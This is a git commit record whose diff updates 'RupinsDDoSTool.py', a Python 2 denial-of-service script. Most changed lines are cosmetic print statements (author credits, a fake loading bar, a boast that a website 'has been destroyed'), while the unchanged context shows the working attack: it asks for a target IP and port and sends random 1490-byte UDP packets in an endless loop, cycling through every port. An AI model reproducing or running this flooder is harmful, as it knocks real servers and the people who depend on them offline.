eb5d9c95d9ab30f5cefac082990d77a54c775f27
Q999777 <63502192+Q999777@users.noreply.github.com>
2020-04-21 18:56:17 -0500

    Update RupinsDDoSTool.py

--- RupinsDDoSTool.py
+++ RupinsDDoSTool.py
@@ -20,30 +20,31 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print ("Author   : Jaden/blackcrow")
-print ("For   : Rupin")
+print "Author   : jaden"
+print "For : rupin"
+print "404   : -_-______-------_---"
+print "Error : website has been destroyed by Jaden"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print ("[Rupin its loading...]")
+print "[                    ] 0% "
 time.sleep(5)
-print ("[=====               ] 25%")
+print "[=====               ] 25%"
 time.sleep(5)
-print ("[==========          ] 50%")
+print "[==========          ] 50%"
 time.sleep(5)
-print ("==============     ] 75%")
+print "[===============     ] 75%"
 time.sleep(5)
-print ("[====================] 100%")
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print ("Sending Packets....")
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
